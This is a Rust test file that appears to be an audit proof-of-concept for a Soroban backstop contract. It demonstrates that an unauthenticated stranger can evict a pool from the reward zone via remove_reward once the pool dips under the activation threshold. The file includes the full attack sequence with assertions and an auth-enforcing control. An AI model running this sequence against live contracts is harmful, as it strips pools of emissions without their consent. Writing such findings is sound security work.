#![cfg(test)]
#![allow(clippy::zero_prefixed_literal)]

use backstop::BackstopTier;
use soroban_sdk::testutils::Address as _;
use soroban_sdk::Address;
use test_suites::{
    create_fixture_with_data,
    test_fixture::{TokenIndex, SCALAR_7},
};

const ACTIVATION_THRESHOLD_USDC: i128 = 12_500 * SCALAR_7;

/// Reward-zone membership is mutable by anyone, with no authorization.
///
/// `add_reward` (`backstop/src/contract.rs:377`) and `remove_reward` (`:384`) call
/// no `require_auth`, and `remove_from_reward_zone`
/// (`backstop/src/emissions/manager.rs:74`) evicts on an instantaneous threshold
/// comparison with no grace period. Any address can therefore evict any pool the
/// moment its `active_value` crosses below the threshold.
///
/// This PoC uses **no price manipulation**: the pool is brought under the
/// threshold by its own depositor queueing a legitimate withdrawal.
///
/// The fixture calls `mock_all_auths()` (`test_fixture.rs:67`), which would mask a
/// missing `require_auth`, so this test switches the environment into enforcing
/// mode with an empty auth set and includes a positive control.
#[test]
fn poc_reward_zone_membership_needs_no_authorization() {
    let fixture = create_fixture_with_data(false);
    let e = fixture.env.clone();
    let victim = fixture.pools[0].pool.address.clone();
    let depositor = fixture.users[0].clone();
    let stranger = Address::generate(&e);

    assert!(fixture.backstop.reward_zone().contains(&victim));
    let start_value = fixture.backstop.pool_data(&victim).active_value;
    std::println!("active_value at start = {} (7dp USD)", start_value);
    assert!(start_value >= ACTIVATION_THRESHOLD_USDC);

    // Drop under the threshold honestly: the depositor queues a withdrawal of
    // most of their own stake. No swap, no manipulated read.
    fixture.backstop.queue_withdrawal(
        &BackstopTier::SecondLoss,
        &depositor,
        &victim,
        &(41_000 * SCALAR_7),
    );
    let dipped_value = fixture.backstop.pool_data(&victim).active_value;
    std::println!("active_value after queued withdrawal = {}", dipped_value);
    assert!(
        dipped_value < ACTIVATION_THRESHOLD_USDC,
        "pool is now legitimately under the threshold"
    );

    // Enforcing mode, empty auth set: any `require_auth` in the call path fails.
    // Positive control -- `deposit` authenticates `from`, so it must fail here.
    e.set_auths(&[]);
    let control = fixture.backstop.try_deposit(
        &BackstopTier::SecondLoss,
        &depositor,
        &victim,
        &(1 * SCALAR_7),
    );
    assert!(
        control.is_err(),
        "control: an authenticated entry point must fail with no auth entries"
    );

    // `remove_from_reward_zone` needs a fresh distribution checkpoint. That guard
    // is no obstacle: `distribute` is permissionless too, so it is refreshed here
    // under the same empty auth set.
    e.set_auths(&[]);
    fixture.backstop.distribute();

    // The finding: eviction succeeds under the same empty auth set, called by an
    // address with no relationship to the pool or its depositors.
    e.set_auths(&[]);
    fixture.backstop.remove_reward(&victim);
    std::println!(
        "stranger {:?} evicted the pool with zero auth entries",
        stranger
    );
    assert!(
        !fixture.backstop.reward_zone().contains(&victim),
        "pool was evicted by an unauthenticated caller"
    );
    assert!(
        e.auths().is_empty(),
        "no authorization was recorded for the eviction"
    );

    // The victim had no say and no window to react: the threshold test is
    // instantaneous, so there is no grace period during which they could
    // top the backstop back up.
    std::println!("emissions membership lost with no consent and no cooldown");
}
